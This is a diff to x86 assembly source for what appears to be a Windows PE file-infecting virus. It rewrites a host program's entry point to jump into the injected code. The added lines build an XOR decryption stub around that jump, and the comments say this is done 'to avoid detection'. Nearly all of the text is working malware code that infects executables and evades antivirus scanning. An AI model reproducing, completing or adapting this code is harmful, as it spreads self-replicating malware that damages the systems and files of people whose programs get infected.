@@ -575,7 +575,7 @@ stosb
 
 ; CREATE REVERT PATCH ON OLD ENTRY POINT
 PATCHER_SIZE = 17
-; Patch
+; Create jmp
 mov	edi, [DELTA PeFileMap]
 add	edi, [DELTA PointerToRawData]
 add	edi, DECRYPTER_SIZE ; After decrypter add our patch
@@ -636,18 +636,54 @@ xor	eax, [DELTA XorCrypt] ; encrypt
 stosd
 
 
-; SETTING JUMP ON FIRST SECTION POINTING TO US
-; Setting where we place our jmp (section + offset EP if needed)
+; Patch setting jump on first section pointing to us
+; Decrypt jmp
+PATCH_DECRYPT_SIZE = 22
+PATCH_SIZE = PATCH_DECRYPT_SIZE + 5
+; Setting where we place our patch (section + offset EP if needed)
 mov	edi, [DELTA PeFileMap]
 add	edi, [DELTA CodeSecRawData] ; filemap + pointer to raw data of code section
 add	edi, [DELTA OffsetCodeSecEP] ; offset of EP
+; Decrypt jmp to avoid detection
+mov	eax, 0B9h ; Mov ecx imm32
+stosb
+mov	eax, 05h ; size of jump
+stosd
+mov	eax, 0BFh ; Mov edi imm32
+stosb
+; Get JMP Addr
+mov	ebx, [DELTA BaseImage]
+add	ebx, [DELTA OldEntryPoint]
+add	ebx, PATCH_DECRYPT_SIZE
+mov	eax, ebx
+stosd
+mov	eax, 0BEh ; Mov esi imm32
+stosb
+mov	eax, ebx
+stosd
+; Create loop now
+mov	eax, 0ACh ; lodsb
+stosb
+mov	eax, 0F083h ; xor eax imm8
+stosw
+mov	eax, XorCrypt
+stosb
+mov	eax, 0AAh ; stosb
+stosb
+mov	eax, 0E2h ; loop rel8
+stosb
+mov	eax, 0FFh - 06h
+stosb
 ; JUMP!JUMP!JUMP!
 mov	eax, 0E9h ; JMP rel32 OPCODE
+xor	eax, XorCrypt
 stosb
 mov	eax, [DELTA VirtualAddress]
 sub	eax, [DELTA CodeSecVA]
 sub	eax, [DELTA OffsetCodeSecEP] ; addr rel = Our VA - their VA - offset EP
 sub	eax, 05h ; Remove 5 bytes for JMP
+sub	eax, PATCH_DECRYPT_SIZE ; Remove our decrypter size
+xor	eax, XorCrypt
 stosd
 
 
